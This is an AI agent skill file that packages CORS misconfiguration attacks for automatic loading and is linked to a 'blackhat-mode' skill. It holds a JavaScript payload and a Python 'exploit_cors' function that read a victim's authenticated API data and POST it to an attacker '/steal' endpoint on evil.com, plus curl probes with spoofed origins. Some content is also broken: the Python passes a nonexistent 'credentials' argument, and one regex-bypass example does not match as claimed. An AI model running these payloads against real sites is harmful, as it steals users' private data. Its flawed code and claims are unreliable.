---
name: cors-tools
description: "CORS misconfiguration — origin reflection, null origin, preflight bypass."
version: 1.0.0
author: Yatim
metadata:
  hermes:
    tags: [cors, origin, preflight, acac, cross-origin]
    related_skills: [blackhat-mode, exploit-tools, hunt-cors]
prerequisites:
  commands: [python]
---

# CORS Attack Tools

## When to Load This Skill

User requests:
- "CORS", "origin", "cross-origin", "preflight", "ACAC"

---

## Detection

```bash
# Basic origin reflection
curl -sI -H "Origin: https://evil.com" URL | grep -i "access-control"

# Null origin
curl -sI -H "Origin: null" URL | grep -i "access-control"

# Subdomain check
curl -sI -H "Origin: https://evil.TARGET.com" URL | grep -i "access-control"

# Pre-flight
curl -sI -X OPTIONS -H "Origin: https://evil.com" -H "Access-Control-Request-Method: POST" URL
```

## Bypass Techniques

### Origin Reflection

```html
<!-- If server reflects any origin -->
<script>
fetch('https://target.com/api/user', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
    fetch('https://evil.com/steal', {method: 'POST', body: JSON.stringify(data)});
  });
</script>
```

### Null Origin

```html
<!-- sandboxed iframe sends null origin -->
<iframe sandbox="allow-scripts" src="data:text/html,<script>...</script>">
```

### Subdomain Regex Bypass

```
# If regex: /^https:\/\/.*\.target\.com$/
https://evil-target.com        # Matches!
https://target.com.evil.com    # Matches!
https://.target.com            # Matches!
```

### HTTP Origin

```
# If server accepts HTTP
http://target.com
```

---

## Python CORS Tools

### CORS Tester

```python
import requests

def test_cors(url, evil_origins):
    results = []
    
    for origin in evil_origins:
        headers = {'Origin': origin}
        r = requests.get(url, headers=headers)
        
        acao = r.headers.get('Access-Control-Allow-Origin')
        acac = r.headers.get('Access-Control-Allow-Credentials')
        
        results.append({
            'origin': origin,
            'acao': acao,
            'acac': acac,
            'vulnerable': acao == origin and acac == 'true'
        })
    
    return results

# Test origins
origins = [
    'https://evil.com',
    'null',
    'https://evil-target.com',
    'http://target.com',
    'https://target.com.evil.com',
]
```

### CORS Exploiter

```python
import requests

def exploit_cors(url, evil_url):
    # Get victim data
    headers = {'Origin': evil_url}
    r = requests.get(url, headers=headers, credentials=True)
    
    # Send to attacker
    data = r.text
    requests.post(f'{evil_url}/steal', data={'data': data})
    
    return True
```

---

## Output Format

```json
{
  "url": "https://target.com/api/user",
  "cors": {
    "acao": "https://evil.com",
    "acac": "true",
    "vulnerable": true,
    "bypass": "origin_reflection"
  }
}
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| No CORS headers | Not implemented | Try different endpoint |
| ACAO: * | Wildcard, no credentials | Cannot steal data |
| ACAO: null | Null origin accepted | Use sandboxed iframe |
